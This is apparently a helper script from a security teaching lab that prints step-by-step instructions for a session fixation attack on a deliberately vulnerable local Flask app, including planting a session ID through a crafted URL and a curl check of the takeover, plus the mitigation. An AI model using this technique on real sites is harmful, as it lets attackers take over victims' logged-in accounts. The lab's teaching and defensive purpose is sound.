#!/usr/bin/env python3
"""
S2 — Session Fixation helper
==============================
Prints the two-step instructions for the session fixation attack.

Why two steps?
--------------
flask-session stores session data in server-side files.  The cookie value is
an opaque ID that must match an existing file — the server ignores IDs it does
not recognise and creates a new session.  The attacker therefore must first
obtain a *real* session ID from the server (Step A) before planting it in the
victim's browser (Step B).

Step A — Attacker gets a real session ID
  GET http://localhost:5000/set          (no ?sid= parameter)
  The server creates a session file for the attacker.
  The attacker copies the session= value from the Set-Cookie response header
  (visible in DevTools → Network → Response Headers).

Step B — Attacker plants the ID in the victim's browser
  The attacker sends the victim: http://localhost:5000/set?sid=<ATTACKER_ID>
  The /set route overwrites the victim's session cookie with the attacker's ID.
  The victim is redirected to /login.

After the victim logs in:
  - Because REGENERATE_SESSION=False, the app writes user_id into the *existing*
    session file for the attacker's ID — it does NOT create a new ID.
  - The attacker's browser still has that same cookie → they are now authenticated
    as the victim without ever knowing the password.

Verification
  curl -s -b "session=<ATTACKER_ID>" http://localhost:5000/dashboard
  Expected: 200 with victim's dashboard content.

Usage
-----
    python attacker/fixation.py [--host http://localhost:5000]
"""

import argparse


def main() -> None:
    parser = argparse.ArgumentParser(description="S2 Session Fixation — instructions")
    parser.add_argument(
        "--host",
        default="http://localhost:5000",
        help="Base URL of the PoC application (default: http://localhost:5000)",
    )
    args = parser.parse_args()
    host = args.host.rstrip("/")

    print("=" * 64)
    print("S2 — SESSION FIXATION ATTACK  (two-step)")
    print("=" * 64)
    print()
    print("STEP A — Attacker: get a real server-side session ID")
    print("-" * 64)
    print(f"  1. Open your browser (Attacker window).")
    print(f"  2. Navigate to:  {host}/set")
    print(f"  3. Open DevTools → Network → click the /set request.")
    print(f"  4. In Response Headers, find:  Set-Cookie: session=<VALUE>")
    print(f"  5. Copy the <VALUE> — this is your planted session ID.")
    print()
    print("STEP B — Plant the ID in the victim's browser")
    print("-" * 64)
    print(f"  6. Send the victim this URL (or open it in a second browser):")
    print(f"     {host}/set?sid=<YOUR_SESSION_ID>")
    print(f"  7. The victim is redirected to /login with your session ID set.")
    print(f"  8. The victim logs in normally.")
    print()
    print("STEP C — Verify takeover")
    print("-" * 64)
    print(f"  9. In the Attacker window, navigate to: {host}/dashboard")
    print(f"     You should land on the victim's authenticated dashboard.")
    print()
    print(f"  Or verify with curl:")
    print(f"    curl -s -b 'session=<YOUR_SESSION_ID>' {host}/dashboard | grep -i 'logged in'")
    print()
    print("  Expected: 200 with victim's username in the response.")
    print()
    print("MITIGATION (SECURE profile)")
    print("-" * 64)
    print("  session.clear() on login deletes the server-side session file for")
    print("  the planted ID and issues a brand-new ID.  The planted ID becomes")
    print("  an orphan — the attacker's cookie points to nothing.")
    print("=" * 64)


if __name__ == "__main__":
    main()
